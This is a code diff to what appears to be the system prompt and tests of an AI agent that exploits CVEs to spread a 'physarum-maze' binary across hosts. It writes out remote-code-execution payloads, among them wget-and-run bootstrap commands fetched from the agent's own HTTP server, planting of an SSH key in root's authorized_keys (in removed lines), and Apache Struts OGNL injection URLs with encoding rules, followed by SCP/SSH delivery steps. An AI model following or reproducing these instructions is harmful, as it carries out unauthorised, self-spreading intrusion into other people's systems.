@@ -112,12 +112,13 @@ The delivery mechanism depends on which ports are open — choose SSH-first when
 This path uses only port 22 (SSH/SCP), which Security Groups always permit internally.
 No exotic ports required. Works in Docker, AWS VPC, and any real environment.
 
-Step 1 — HttpPost (RCE via CVE): plant the ephemeral pubkey in authorized_keys.
-  The CVE payload must execute this shell command on the target:
-    mkdir -p /root/.ssh && chmod 700 /root/.ssh \
-    && echo '<ephemeral_pubkey>' >> /root/.ssh/authorized_keys \
-    && chmod 600 /root/.ssh/authorized_keys
-  Replace <ephemeral_pubkey> with the exact value from DiscoveryQuery.ephemeral_pubkey.
+Step 1 — HttpPost (RCE via CVE): download and execute the bootstrap script.
+  The agent HTTP server (source_ip:8001) serves /bootstrap.sh which plants the ephemeral pubkey
+  and creates /tmp/physarum on the target. The CVE payload must run this two-command sequence:
+    wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh ; sh /tmp/bootstrap.sh
+  Replace <source_ip> with DiscoveryQuery.source_ip.
+  CRITICAL: use a SEMICOLON between the two commands — NO && anywhere.
+  The pubkey is inside bootstrap.sh; do NOT put it in the URL or the shell command.
   Set accept_any_response: true — the command runs regardless of HTTP response status.
 
 Step 2 — ScpUpload: transfer the physarum-maze binary to the target.
@@ -142,9 +143,43 @@ step that downloads and executes the binary in one RCE command:
   Replace <source_ip> with DiscoveryQuery.source_ip.
   Note: requires port 8001 reachable from target — valid for flat Docker networks.
 
+── APACHE STRUTS OGNL INJECTION (S2-xxx advisory CVEs) ──────────────────────────────
+When the version_hint or CVE name indicates an Apache Struts S2-advisory (forced OGNL
+evaluation), the injection vector is a URL query parameter evaluated as OGNL.
+
+MANDATORY ENCODING RULES (violating these silently breaks execution):
+  1. Use SEMICOLONS (;) to chain shell commands — NEVER && (& splits the query string).
+  2. NEVER add & for process backgrounding — java.lang.ProcessBuilder.start() is
+     non-blocking; the child process runs independently without a trailing &.
+  3. NEVER use shell output redirection (> >> 2>&1) — the process output is discarded
+     by default; there is no terminal attached to the OGNL execution context.
+  4. chmod +x MUST be written as chmod+%2Bx — literal + in a query value means space,
+     so the + sign must be percent-encoded as %2B.
+
+OGNL PATH FORMAT (spaces encoded as +, semicolons separate commands):
+  path: \"/?id=%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{\\\"bash\\\",\\\"-c\\\",\\\"<CMD>\\\"})).start()}\"
+  Replace <CMD> with a shell command that follows the encoding rules above.
+  port: use the HTTP port for the Struts service (commonly 8080).
+  headers: [[\"Content-Type\", \"application/x-www-form-urlencoded\"]]
+  accept_any_response: true
+
+EXAMPLE — download physarum-maze and execute (wget fallback, no & needed):
+  \"/?id=%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{\\\"bash\\\",\\\"-c\\\",\\\"mkdir+-p+/tmp/physarum+;+wget+-q+http://<source_ip>:8001/physarum-maze+-O+/tmp/physarum/physarum-maze+;+chmod+%2Bx+/tmp/physarum/physarum-maze+;+/tmp/physarum/physarum-maze+--mode+propagated\\\"})).start()}\"
+
+SSH-FIRST PATH GUIDANCE (when port 22 is open on target):
+  Step 1 HttpPost OGNL → download and run bootstrap.sh. PORT: the HTTP port (e.g. 8080), NOT 22.
+    path: \"/?id=%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{\\\"bash\\\",\\\"-c\\\",\\\"wget+-q+http://<source_ip>:8001/bootstrap.sh+-O+/tmp/bootstrap.sh+;+sh+/tmp/bootstrap.sh\\\"})).start()}\"
+    EXACTLY TWO commands joined by ; — NO && anywhere. No pubkey in the URL.
+    Replace <source_ip> with DiscoveryQuery.source_ip.
+    NEVER send this HttpPost to port 22 — port 22 is SSH and does not speak HTTP.
+  Step 2 ScpUpload → upload binary via SCP (port 22 implicit).
+  Step 3 SshCommand → execute binary via SSH (port 22 implicit).
+
+Use the wget single-step approach only when port 22 is absent from the ports list.
+
 ── COMMON RULES ─────────────────────────────────────────────────────────────────────
-- Use your training knowledge of the confirmed CVE for the exact injection syntax.
-- Each CVE has its own endpoint, parameter, header, or protocol field — do not hardcode.
+- Each CVE has its own endpoint, parameter, header, or protocol field — follow the injection
+  class guidance above when the CVE matches (OGNL, deserialization, SSRF, etc.).
 - Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, Custom (for non-HTTP).
 - Multiple steps are allowed and encouraged for multi-phase CVEs.
 
@@ -290,18 +325,19 @@ mod tests {
         assert!(SYSTEM_PROMPT.contains("accept_any_response"));
         assert!(SYSTEM_PROMPT.contains("nohup"));
         assert!(SYSTEM_PROMPT.contains("--mode propagated"));
-        // SSH-first: pubkey injection, SCP, SshCommand
-        assert!(SYSTEM_PROMPT.contains("ephemeral_pubkey"));
-        assert!(SYSTEM_PROMPT.contains("authorized_keys"));
+        // SSH-first: bootstrap.sh wget approach, SCP, SshCommand
+        assert!(SYSTEM_PROMPT.contains("bootstrap.sh"));
+        assert!(SYSTEM_PROMPT.contains(":8001/bootstrap.sh"));
         assert!(SYSTEM_PROMPT.contains("__self__"));
         assert!(SYSTEM_PROMPT.contains("ScpUpload"));
         assert!(SYSTEM_PROMPT.contains("SshCommand"));
         // wget fallback when no SSH
         assert!(SYSTEM_PROMPT.contains("wget FALLBACK"));
-        // Generic delivery — no hardcoded CVE format in the prompt
+        // OGNL is an injection technique class — allowed as generic guidance
+        assert!(SYSTEM_PROMPT.contains("OGNL"));
+        // No hardcoded CVE IDs or service-specific endpoints
         assert!(!SYSTEM_PROMPT.contains("CVE-2020-17530"));
         assert!(!SYSTEM_PROMPT.contains("showcase.action"));
-        assert!(!SYSTEM_PROMPT.contains("OGNL"));
     }
 
     #[test]
